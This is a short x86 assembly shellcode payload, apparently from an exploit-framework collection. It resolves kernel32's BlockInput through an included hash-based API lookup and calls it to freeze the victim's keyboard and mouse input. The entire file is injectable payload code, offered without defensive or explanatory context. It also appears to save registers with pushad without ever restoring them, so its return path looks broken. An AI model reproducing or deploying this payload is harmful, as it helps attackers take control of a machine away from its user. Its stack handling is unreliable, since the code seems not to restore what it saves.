[BITS 32]
[ORG 0]
 
	pushad                      ; Save all registers to stack
	pushfd                      ; Save all flags to stack
	cld                         ; Clear direction flags
	call start                  ;
	%include "../block_api.asm" ; block_api.asm
start:
	pop ebp                     ; Pop the address of block api 
	push 0x60329411             ; hash(kernel32.dll, BlockInput())
	push dword 0x1              ; TRUE
	call ebp                    ; BlockInput(TRUE)
	popfd                       ; Popback all flags
	ret                         ; <-
